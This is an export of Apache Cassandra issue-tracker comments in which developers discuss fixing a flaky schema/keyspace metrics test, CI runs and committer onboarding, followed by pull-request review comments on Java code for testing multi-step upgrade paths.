|[trunk|https://github.com/apache/cassandra/compare/trunk...adelapena:17658-trunk-review]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1699/workflows/b994c61c-50d1-48af-8b86-f814919fabd3] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1699/workflows/d0d4ffc2-29f9-45be-95c4-3d4b6c4cdcd2]|

The method {{Schema#clear()}} is only meant to be called by tests. Perhaps we should rename it to {{Schema#clearUnsafe()}} to prevent mistakes. This would be in line with methods such as {{ColumnFamilyStore#clearUnsafe()}}, {{Gossiper#clearUnsafe()}}, {{TokenMetadata#clearUnsafe()}} and {{Accumulator#clearUnsafe()}}.;;;","13/Jun/22 15:02;adelapena;[~jlewandowski] it seems that the repeated test runs above keep hitting the failure.;;;","16/Jun/22 08:08;jlewandowski;https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/226/workflows/808cc7d1-03a0-4161-b56c-ca3d6477dfaf/jobs/1491;;;","16/Jun/22 10:25;adelapena;[~jlewandowski] is that the original run with 1000 repetitions? My runs above have 5000 repetitions, all of them still hit the reported failure.;;;","20/Jun/22 06:22;jlewandowski;[~adelapena] which commit are you testing?;;;","20/Jun/22 10:10;adelapena;[This commit|https://github.com/jacek-lewandowski/cassandra/commit/e936f120b7ee1936bab6f62810a6d75af1bb7874], applied to [4.1|https://github.com/apache/cassandra/commit/7f7bfcb1f699214ac7178ae71f13d02ec71a87a3] and [trunk|https://github.com/apache/cassandra/commit/ecc4f3c07e1d13216c0708ed705bfc8de0cb6923]. I've got that commit from [the last CI run above|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/226/workflows/808cc7d1-03a0-4161-b56c-ca3d6477dfaf/jobs/1491], is that the right one?;;;","21/Jun/22 01:28;e.dimitrova;Triaging the 4.1 blockers board, moved to REVIEW IN PROGRESS this one to reflect it is already under review, I hope you don't mind. ;;;","22/Jun/22 07:42;jlewandowski;[~adelapena] I think I found the real issue, here is the test results (5000 repetitions): https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/228/workflows/b125e7b6-d9d5-4756-84ed-9d03cb3f7c47/jobs/1533/steps (/)

I'm running precommit now: https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/228/workflows/41d28ecb-e3b5-49f4-a88b-b6aba84fa11b (!)

;;;","22/Jun/22 08:52;jlewandowski;Unfortunately, there was another problem, rerunning precommit tests: https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/230/workflows/aa77c841-d93b-4cc8-ae38-d79b73983384 (?);;;","22/Jun/22 09:50;adelapena;[~jlewandowski] [this|https://github.com/jacek-lewandowski/cassandra/commits/CASSANDRA-17658] is the branch containing the patch, isn't it? The CI links only point to a single commit, it might be useful to create a PR to be linked here.;;;","22/Jun/22 12:30;jlewandowski;[~adelapena] I'm not sure what do you mean - there is a PR https://github.com/apache/cassandra/pull/1678
;;;","22/Jun/22 14:19;adelapena;I wasn't aware of that PR. I have only seen the CI links on the ticket, and they only point to the last pushed commit. ;;;","23/Jun/22 11:12;jlewandowski;[~adelapena] my apologize for not being precise. What do you think about the latest patch version? The problem was that the keyspace got opened during removal. I think with the provided patch it is not longer possible.;;;","24/Jun/22 11:59;adelapena;No worries :). The fix looks good to me, I have left a couple of suggestions on the PR. I have applied the patch to trunk without conflicts and I'm running CI:
||Branch||CI||
|[4.1 |https://github.com/apache/cassandra/pull/1678]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1727/workflows/82eb2761-d4cf-4fef-a33a-58327aada12d] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1727/workflows/c05e2eea-bff1-4562-bb74-0c14a4da6a0c]|
|[trunk|https://github.com/adelapena/cassandra/tree/17658-trunk-review]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1728/workflows/cd55c0fa-c52c-44ce-9bfa-6460e79f331c] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1728/workflows/4b7e855a-b411-48a1-acfa-b2a87fcae7aa]|

 ;;;","24/Jun/22 12:12;adelapena;CI hasn't finished yet with all the repeated test iterations, but the rest of the jobs have already finished and they look good to me. 

The failure of {{test_counter_node_down}} in 4.1 is due to the branch missing the fix for CASSANDRA-17411. The failure should go aways once it's rebased. The failure doesn't affect trunk because I have applied the proposed patch to a more recent version of the branch that includes CASSANDRA-17411.

As for the failures of {{test_prefer_local_reconnect_on_listen_address}} on trunk, it's a well-known bug reported on CASSANDRA-17700.;;;","28/Jun/22 10:12;jlewandowski;I've applied your comments and rebased. Now the tests are running: https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/232/workflows/675c1235-9414-4c22-979e-5a3f07f5fc3c
;;;","29/Jun/22 07:34;jlewandowski;[~adelapena] is it ok to merge?;;;","29/Jun/22 11:18;adelapena;The failure in [{{test_multiple_repair}}|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/232/workflows/675c1235-9414-4c22-979e-5a3f07f5fc3c/jobs/1599/tests] seems to be CASSANDRA-17005, whereas the failure in [{{testConnectionsAreRejectedWithInvalidConfig}}|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/232/workflows/675c1235-9414-4c22-979e-5a3f07f5fc3c/jobs/1593/tests] is CASSANDRA-17618.

The [repeated run|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/232/workflows/675c1235-9414-4c22-979e-5a3f07f5fc3c/jobs/1611/tests] has hit a timeout that seems acceptable in so many runs.

However, [{{j11_dtests-no-vnodes}}|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/232/workflows/675c1235-9414-4c22-979e-5a3f07f5fc3c/jobs/1595/tests] has hit a lot of failures, which is probably due to an env issue. Probably we should run CI one last time after squash+rebase. We should also include the {{java11_pre-commit_tests}} workflow.

We should also prepare a patch for trunk and run CI for it, with both j8 and j11 workflows.;;;","29/Jun/22 11:23;jlewandowski;Aren't j11 pre-commit tests included in j8-precommit-tests?;;;","29/Jun/22 11:28;adelapena;I think that the problems with [{{j11_dtests-no-vnodes}}|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/232/workflows/675c1235-9414-4c22-979e-5a3f07f5fc3c/jobs/1595/tests] are due to low resources in CircleCI's config file. It seems that all the jobs except that one are using mid resources, but [{{j11_dtests-no-vnodes}} is still using low resources|https://github.com/apache/cassandra/blob/f2068121c7507c79843a11c16efa290c3626d31c/.circleci/config.yml#L3266-L3272]. That's the only part of the config file that changes when I run:
{code:java}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=testsome \
  -e REPEATED_UTEST_COUNT=5000 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.metrics.KeyspaceMetricsTest
{code};;;","29/Jun/22 11:34;adelapena;{quote}Aren't j11 pre-commit tests included in j8-precommit-tests?
{quote}
They aren't, the j11 tests on the {{j8-precommit-tests}} workflow build cassandra with j8 and run the tests with both j8 and j11. The [{{j11-precommit-tests}} workflow|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/232/workflows/20ea8c6c-3d20-4d84-91f9-f3319ab18f87] uses j11 for both building and running. I am afraid we have to run both workflows to test all the j8-j8, j8-j11 and j11-j11 combinations.;;;","30/Jun/22 08:39;adelapena;I have run CI with the patch squashed, rebased, with [this remaining nit|https://github.com/apache/cassandra/pull/1678#discussion_r909498110], and also applied to trunk:
||PR||CI||
|[4.1 |https://github.com/adelapena/cassandra/commit/15370acb4f5c13b648d9862f408365c8768f7a6b]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1754/workflows/164a3773-009f-4f44-a720-43944f32b277] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1754/workflows/bab8309c-3c7d-4a3f-b48f-ea985a5f97bc]|
|[trunk|https://github.com/adelapena/cassandra/commit/7f7bb3ead9da2eec1332dcd25baccdc394aaa3bb]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1753/workflows/7f28cf83-3a39-4857-be94-ed80300fbaca] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1753/workflows/e928312c-f129-4417-9b80-ee746488b26f]|

All looks good. However these runs don't include [this last nit|https://github.com/apache/cassandra/pull/1678/commits/32aba6148fadb2ca3d053213850c7fea69e51ebf]. [~jlewandowski] do we have full CI results for it?;;;","30/Jun/22 16:05;e.dimitrova;For the record, it seems changing statuses marked me as a reviewer without being one.

If you need me to review it, I can do it next week, otherwise, please, feel free to remove me from the list of reviewers.;;;","30/Jun/22 16:58;jlewandowski;https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/234/workflows/191b60a4-148d-4158-8885-267ea82210f6
https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/234/workflows/15d428fe-7d12-4b42-995d-e395fb3a6fde
;;;","30/Jun/22 17:38;adelapena;[~e.dimitrova] I've removed you as reviewer since it was accidental. However we'll need a second committer-reviewer for this, so it will be great if you have some time to take a look.

[~jlewandowski] Do you have a patch and CI runs for trunk?

As for [this remaining nit|https://github.com/apache/cassandra/pull/1678#discussion_r909498110], I can remove the unneeded annotation on commit.;;;","30/Jun/22 17:43;e.dimitrova;Setting to Needs Committer and if no one picks it until Tuesday I will do it, thanks;;;","01/Jul/22 14:45;jlewandowski;PR for trunk: https://github.com/apache/cassandra/pull/1716
j11: https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/237/workflows/b9eb4a84-b30c-4fd5-9ca9-ea47f114eef0
j8: https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/237/workflows/1f0ebea4-0b45-4fee-a47f-d688801ac695;;;","01/Jul/22 21:34;adelapena;Great, thanks. All the failed tests appear on Butler. Looks good to me, +1.;;;","05/Jul/22 23:01;e.dimitrova;Overall LGTM and CI looks ok, I left a few small questions/comments in the 4.1 PR .

I saw a Jolokia issue again in the J11 runs and I noticed in the logs:

 
{code:java}
stdout = b""WARNING: An illegal reflective access operation has occurred\nWARNING: Illegal reflective access by org.jolokia.jvma...rt '8778' is already occupied.\nPlease check the standard output of the target process for a detailed error message.\n"" stderr = None, retcode = 1 {code}
So that reminded me to check our version of Jolokia for dtests it seems we are on 1.6 and official support for Java 11 was added in 1.7 so I suspect we need to update the agent. I will open a separate ticket to tackle this problem, not related to the current ticket. 

 ;;;","11/Jul/22 10:50;jlewandowski;Thanks, I've applied your suggestions on 4.1 branch and started CI https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/238/workflows/3ea0df08-d74d-4b74-bb56-ffdfa9daf147 (/)

Once ok, I'll add changes to trunk branch and run the rest of the tests;;;","11/Jul/22 14:19;jlewandowski;j11 https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/238/workflows/5968ce11-1c64-4997-81c5-7e77327547de (/)
;;;","11/Jul/22 17:20;e.dimitrova;Latest changes seem reasonable to me and the CI looks quite green. +1 in case [~adelapena] does not having anything against those synchronizations of course;;;","12/Jul/22 08:20;jlewandowski;||PR||CI||
|[trunk|https://github.com/apache/cassandra/pull/1716]|[j8|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/239/workflows/b2cdc13f-f077-4741-80f9-b1bfa15b1d80](/), [j11|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/239/workflows/a91a1f21-1ba8-4a3c-8987-831ad42ea40e](/)|
|[4.1|https://github.com/apache/cassandra/pull/1678]|[j8|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/238/workflows/3ea0df08-d74d-4b74-bb56-ffdfa9daf147](/), [j11|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/238/workflows/5968ce11-1c64-4997-81c5-7e77327547de](/)|
;;;","12/Jul/22 11:09;adelapena;Looks good to me. Just in case, I have started some additional repeated runs of {{KeyspaceMetricsTest}} with the most recent changes, and also of the new test on {{{}SchemaTest{}}}:
||Test||CI||
|{{KeyspaceMetricsTest}}|[4.1|https://app.circleci.com/pipelines/github/adelapena/cassandra/1907/workflows/9106f6a3-08a9-4c86-8a3d-5ca9fd3d1868] [trunk|https://app.circleci.com/pipelines/github/adelapena/cassandra/1911/workflows/95ccb26b-f636-4d9f-bd86-8e7d3cde42f3]|
|{{SchemaTest}}|[4.1|https://app.circleci.com/pipelines/github/adelapena/cassandra/1910/workflows/2ce26187-7143-4c70-a825-1636b78ac63d] [trunk|https://app.circleci.com/pipelines/github/adelapena/cassandra/1909/workflows/b47cb176-62de-40a1-9df5-6e6224080971]|;;;","12/Jul/22 14:49;adelapena;All looks good, I think we are ready to commit. [~jlewandowski] I think you should be able to commit this yourself now that you are powerful committer. Please let me know if you need any help.;;;","13/Jul/22 14:34;jlewandowski;thank you [~adelapena], yes, I need some help, but I think I don't have an account yet :);;;","14/Jul/22 11:05;adelapena;I think there is some information about the account [here|https://infra.apache.org/new-committers-guide.html#apache-committer-account-creation]. IIRC you have to upload you public key to [https://id.apache.org|https://id.apache.org/]. Then you can link the GitHub/GitBox accounts [here|https://git.apache.org/], so you can push to GitHub.

As for the commit process itself, there are examples [here|https://cassandra.apache.org/_/development/how_to_commit.html].

I don't know if you have received the email notifying that the committer account has been created yet. If not, I can commit this for you in the meantime, or we can wait a bit until you have the account, as you prefer.;;;","21/Jul/22 14:02;e.dimitrova;Hey [~jlewandowski] , did you try your commit rights? I don't think you will get any notification or anything, they are just assigned pretty quickly normally after you are told you are a committer already. Please let us know if you need any help. ;;;","12/Aug/22 12:01;jlewandowski;Note that, in the end, I have renamed the incorrect branch from CASSANDRA-17568-trunk to CASSANDRA-17658-trunk
;;;","16/Aug/22 16:42;adelapena;It seems that the new {{SchemaTest.schemaReset}} is flaky, see CASSANDRA-17819.

IIRC that test survived 1000 repeated runs on the multiplexer the last time we run it for [4.1|https://app.circleci.com/pipelines/github/adelapena/cassandra/1910/workflows/2ce26187-7143-4c70-a825-1636b78ac63d] and [trunk|https://app.circleci.com/pipelines/github/adelapena/cassandra/1909/workflows/b47cb176-62de-40a1-9df5-6e6224080971], but that was almost one month before commit. Maybe something happened during the rebase?;;;","17/Aug/22 17:28;e.dimitrova;The one ran in a loop indeed has the same name, but it is different class - the one tested was a unit test, the flaky one is in-jvm. I will push some runs now to see where it broke. Thanks for raising it!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,
jvm-dtest upgrade tests run all supported pairs of upgrades between from/to but does not actually test all patches from/to,CASSANDRA-17656,13446453,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,23/May/22 21:22,17/Jun/22 07:35,13/Jul/23 08:40,06/Jun/22 21:53,NA,,,,,,Test/dtest/java,,,,0,,"The current upgrade from/to logic is based off a list filter on from/to pairs, and runs the test multiple times for each pair; this does not actually validate that the different paths upgrade cleanly.

Instead, we need to test each supported path; example 3.0 -> 4.2

{code}
3.0.28 -> [4.2]
3.0.28 -> [3.11.14, 4.2]
3.0.28 -> [4.1-alpha1, 4.2]
3.0.28 -> [4.0.5, 4.2]
3.0.28 -> [3.11.14, 4.1-alpha1, 4.2]
3.0.28 -> [3.11.14, 4.0.5, 4.2]
3.0.28 -> [4.0.5, 4.1-alpha1, 4.2]
3.0.28 -> [3.11.14, 4.0.5, 4.1-alpha1, 4.2]
{code}",,dcapwell,jonmeredith,,,,,,,,,,,,,"dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r879896172


##########
test/distributed/org/apache/cassandra/distributed/upgrade/MixedModeFrom3ReplicationTest.java:
##########
@@ -18,21 +18,65 @@
 
 package org.apache.cassandra.distributed.upgrade;
 
+import java.util.ArrayList;
+import java.util.List;
+
 import org.junit.Test;
 
-import org.apache.cassandra.distributed.shared.Versions;
+import org.apache.cassandra.distributed.api.ConsistencyLevel;
 
-public class MixedModeFrom3ReplicationTest extends MixedModeReplicationTestBase
-{
-    @Test
-    public void testSimpleStrategy30to3X() throws Throwable
-    {
-        testSimpleStrategy(v30, v3X);
-    }
+import static org.apache.cassandra.distributed.shared.AssertUtils.assertRows;
+import static org.apache.cassandra.distributed.shared.AssertUtils.row;
 
+public class MixedModeFrom3ReplicationTest extends UpgradeTestBase

Review Comment:
   `MixedModeReplicationTestBase` only was extended by this class, so was simpler to just inline all the logic here...



;23/May/22 21:57;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r879897355


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -153,20 +189,29 @@ public TestCase upgradesFrom(Semver from)
         /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
-                {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+            List<TestVersions> upgrades = findUpgradePaths(from, to);
+            // order by most direct to largest path
+            Collections.sort(upgrades, Comparator.comparingInt(a -> a.upgrade.size()));
+            logger.info(""Adding upgrades of\n{}"", upgrades.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));

Review Comment:
   this isn't needed... I did this as I tried to make tests dynamic rather than running everything as a single test... I kept it assuming that if an issue exists it is likely to be in the direct path rather than the longer path (unless dealing with old data problems like 2.x -> 4.x)



;23/May/22 21:59;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r879899005


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -153,20 +189,29 @@ public TestCase upgradesFrom(Semver from)
         /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
-                {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+            List<TestVersions> upgrades = findUpgradePaths(from, to);
+            // order by most direct to largest path
+            Collections.sort(upgrades, Comparator.comparingInt(a -> a.upgrade.size()));
+            logger.info(""Adding upgrades of\n{}"", upgrades.stream().map(TestVersions::toString).collect(Collectors.joining(""\n"")));
+            this.upgrade.addAll(upgrades);
             return this;
         }
 
+        private List<TestVersions> findUpgradePaths(Semver from, Semver to)
+        {
+            return SUPPORTED_UPGRADE_PATHS.findPaths(from, to).stream()
+                                          .map(m -> new TestVersions(versions.getLatest(m.get(0)), m.stream().skip(1).map(versions::getLatest).collect(Collectors.toList())))
+                                          .collect(Collectors.toList());
+        }
+
         /** Will test this specific upgrade path **/
         public TestCase singleUpgrade(Semver from)
         {
-            this.upgrade.add(new TestVersions(versions.getLatest(from), versions.getLatest(CURRENT)));
+            TestVersions target = new TestVersions(versions.getLatest(from), Arrays.asList(versions.getLatest(CURRENT)));
+            Set<TestVersions> supported = new HashSet<>(findUpgradePaths(from, CURRENT));
+            if (!supported.contains(target))

Review Comment:
   the thought process is that there may be cases in the future where from can't directly go to to, such as 2.1 -> 4.2.... this just makes sure we detect that when the test is running



;23/May/22 22:01;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r879899772


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -226,24 +271,40 @@ public void run() throws Throwable
 
             for (TestVersions upgrade : this.upgrade)
             {
-                logger.info(""testing upgrade from {} to {}"", upgrade.initial.version, upgrade.upgrade.version);
+                logger.info(""testing upgrade from {} to {}"", upgrade.initial.version, upgrade.upgradeVersions);
                 try (UpgradeableCluster cluster = init(UpgradeableCluster.create(nodeCount, upgrade.initial, configConsumer, builderConsumer)))
                 {
                     setup.run(cluster);
 
-                    for (int n : nodesToUpgrade)
+
+
+                    for (Version nextVersion : upgrade.upgrade)
                     {
-                        cluster.get(n).shutdown().get();
-                        cluster.get(n).setVersion(upgrade.upgrade);
-                        runBeforeNodeRestart.run(cluster, n);
-                        cluster.get(n).startup();
-                        runAfterNodeUpgrade.run(cluster, n);
+                        try
+                        {
+                            for (int n : nodesToUpgrade)
+                            {
+                                cluster.get(n).shutdown().get();
+                                triggerGC();
+                                cluster.get(n).setVersion(nextVersion);
+                                runBeforeNodeRestart.run(cluster, n);
+                                cluster.get(n).startup();
+                                runAfterNodeUpgrade.run(cluster, n);
+                            }
+
+                            runAfterClusterUpgrade.run(cluster);
+
+                            cluster.checkAndResetUncaughtExceptions();

Review Comment:
   if logs have a bad issue, trigger early so we don't deal with ""there was an error somewhere""... can still happen after the fact... just trying to be nice!



;23/May/22 22:02;githubbot;600","dcapwell commented on PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#issuecomment-1136129594

   spoke with @jonmeredith in slack, I will revert back to `upgradeFrom(v30)`.  He pointed out that we really want to test all upgrade paths, but don't have a clear solution on how to do that given CI and JVM Metaspace limitations (testing out POC but likely to punt if not working by EOD)


;24/May/22 16:16;githubbot;600","dcapwell commented on PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#issuecomment-1136554179

   I gave up on trying to make the tests better... we really need a template system or code generation system where we create 1 class for each path...  given how we currently do this we need `*Test.java` files for each, so something would need to know how and generate it!  We could do this via a script, but then we need this to work on all environments... we could do this with an annotation processor, but need to make things more complex at build time since annotation processors need to be compiled before the tests compile


;25/May/22 00:17;githubbot;600","dcapwell commented on PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#issuecomment-1136570315

   looking into `org.apache.cassandra.distributed.upgrade.CompactStorageUpgradeTest#compactStoragePagingTest`, not sure why it OOMs when it matches the same pattern as other tests...


;25/May/22 00:47;githubbot;600","dcapwell commented on PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#issuecomment-1136583616

   just switched to `.singleUpgrade` for CompactStorageUpgradeTest; I think a leak is happening but don't have the bandwidth to look into that...


;25/May/22 01:06;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r881986114


##########
test/distributed/org/apache/cassandra/distributed/upgrade/CompactStorageUpgradeTest.java:
##########
@@ -37,7 +37,7 @@ public void compactStorageColumnDeleteTest() throws Throwable
         new TestCase()
         .nodes(2)
         .nodesToUpgrade(2)
-        .upgradesFrom(v30)
+        .singleUpgrade(v30)

Review Comment:
   there are too many tests to try multiple upgrade paths from 3.0... so avoid and just run 3.0 -> trunk



;25/May/22 18:29;githubbot;600","michaelsembwever commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r882141963


##########
test/distributed/org/apache/cassandra/distributed/upgrade/CompactStorageUpgradeTest.java:
##########
@@ -37,7 +37,7 @@ public void compactStorageColumnDeleteTest() throws Throwable
         new TestCase()
         .nodes(2)
         .nodesToUpgrade(2)
-        .upgradesFrom(v30)
+        .singleUpgrade(v30)

Review Comment:
   upgrading from 3.11 is (a slightly more) recommended upgrade path, not just 3.0
   
   the upgrade tests need to test our supported and recommended upgrade paths, IMHO.
   
   see here: https://lists.apache.org/thread/odk114pfpzpwj81sj2vdzmzt5rgn74wk 



;25/May/22 21:47;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r882952661


##########
test/distributed/org/apache/cassandra/distributed/upgrade/CompactStorageUpgradeTest.java:
##########
@@ -37,7 +37,7 @@ public void compactStorageColumnDeleteTest() throws Throwable
         new TestCase()
         .nodes(2)
         .nodesToUpgrade(2)
-        .upgradesFrom(v30)
+        .singleUpgrade(v30)

Review Comment:
   the function mutates a list, so we could always do
   
   ```
   .singleUpgrade(v30)
   .singleUpgrade(v3x)
   ```
   
   so we test both



;26/May/22 18:23;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r882957720


##########
test/distributed/org/apache/cassandra/distributed/upgrade/CompactStorageUpgradeTest.java:
##########
@@ -37,7 +37,7 @@ public void compactStorageColumnDeleteTest() throws Throwable
         new TestCase()
         .nodes(2)
         .nodesToUpgrade(2)
-        .upgradesFrom(v30)
+        .singleUpgrade(v30)

Review Comment:
   updated, we now have
   
   ```
   INFO  [main] 2022-05-26 11:29:59,284 UpgradeTestBase.java:207 - Adding upgrade of 3.0.28 -> [4.2]
   INFO  [main] 2022-05-26 11:29:59,285 UpgradeTestBase.java:207 - Adding upgrade of 3.11.14 -> [4.2]
   ```



;26/May/22 18:30;githubbot;600","michaelsembwever commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r883294989


##########
test/distributed/org/apache/cassandra/distributed/upgrade/CompactStorageUpgradeTest.java:
##########
@@ -37,7 +37,7 @@ public void compactStorageColumnDeleteTest() throws Throwable
         new TestCase()
         .nodes(2)
         .nodesToUpgrade(2)
-        .upgradesFrom(v30)
+        .singleUpgrade(v30)

Review Comment:
   wfm. (presuming `[4.2]` becomes whatever current is, so long as the from-to remains something found in the supported_paths)



;27/May/22 05:51;githubbot;600","michaelsembwever commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r883315731


##########
test/unit/org/apache/cassandra/utils/SimpleGraph.java:
##########
@@ -0,0 +1,135 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.utils;
+
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
+import java.util.SortedSet;
+import java.util.TreeSet;
+import java.util.function.Consumer;
+
+import com.google.common.collect.ImmutableMap;
+import com.google.common.collect.ImmutableSet;
+import com.google.common.collect.Ordering;
+
+/**
+ * A directed graph. Main usage is the {@link #findPaths(Object, Object)} method which is used to find all paths between
+ * 2 vertices.
+ */
+public class SimpleGraph<V>
+{
+    private final ImmutableMap<V, ImmutableSet<V>> edges;
+
+    private SimpleGraph(ImmutableMap<V, ImmutableSet<V>> edges)
+    {
+        if (edges == null || edges.isEmpty())
+            throw new AssertionError(""Edges empty"");
+        this.edges = edges;
+    }
+
+    public static <T> SimpleGraph<T> of(T... values)

Review Comment:
   (trivial) for readability i would have passed in pairs (it confused me reading the code where this was used and i had to go here and read it to understand). i understand that it would make the calling code more verbose 🤷🏻‍♀️



;27/May/22 06:30;githubbot;600","michaelsembwever commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r886876061


##########
test/distributed/org/apache/cassandra/distributed/upgrade/UpgradeTestBase.java:
##########
@@ -153,20 +184,40 @@ public TestCase upgradesFrom(Semver from)
         /** performs all supported upgrade paths that exist in between from and to (inclusive) **/
         public TestCase upgrades(Semver from, Semver to)
         {
-            SUPPORTED_UPGRADE_PATHS.stream()
-                .filter(upgradePath -> (upgradePath.left.compareTo(from) >= 0 && upgradePath.right.compareTo(to) <= 0))
-                .forEachOrdered(upgradePath ->
+            List<TestVersions> upgrade = new ArrayList<>();
+            List<Version> toVersions = Collections.singletonList(versions.getLatest(to));
+            NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
+            for (Semver start : vertices.subSet(from, to))
+            {
+                // only include pairs that are allowed
+                if (SUPPORTED_UPGRADE_PATHS.hasEdge(start, to))
+                    upgrade.add(new TestVersions(versions.getLatest(start), toVersions));
+            }
+            if (CURRENT.equals(from))
+            {
+                // when from=CURRENT we want to test upgrading to more recent versions rather than just upgrading
+                // from previous versions; so special case that
+                for (Semver end : vertices.subSet(from, false, to, false)) //from->to included above, so don't need to readd
                 {
-                    this.upgrade.add(
-                            new TestVersions(versions.getLatest(upgradePath.left), versions.getLatest(upgradePath.right)));
-                });
+                    if (SUPPORTED_UPGRADE_PATHS.hasEdge(CURRENT, end))
+                        upgrade.add(new TestVersions(versions.getLatest(CURRENT), Collections.singletonList(versions.getLatest(end))));
+                }
+            }

Review Comment:
   curious if this can be simplified to
   ```
   
               List<TestVersions> upgrade = new ArrayList<>();
               NavigableSet<Semver> vertices = sortedVertices(SUPPORTED_UPGRADE_PATHS);
               for (Semver vertex : vertices.subSet(from, true, to, true))
               {
                   if (SUPPORTED_UPGRADE_PATHS.hasEdge(CURRENT, vertex))
                       upgrade.add(new TestVersions(versions.getLatest(CURRENT), Collections.singletonList(versions.getLatest(vertex))));
                   
                   if (SUPPORTED_UPGRADE_PATHS.hasEdge(vertex, CURRENT))
                       upgrade.add(new TestVersions(versions.getLatest(vertex), Collections.singletonList(versions.getLatest(CURRENT))));
               }
   ```



;01/Jun/22 14:27;githubbot;600","dcapwell commented on code in PR #1642:
URL: https://github.com/apache/cassandra/pull/1642#discussion_r887153228


##########
test/unit/org/apache/cassandra/utils/SimpleGraph.java:
##########
@@ -0,0 +1,135 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
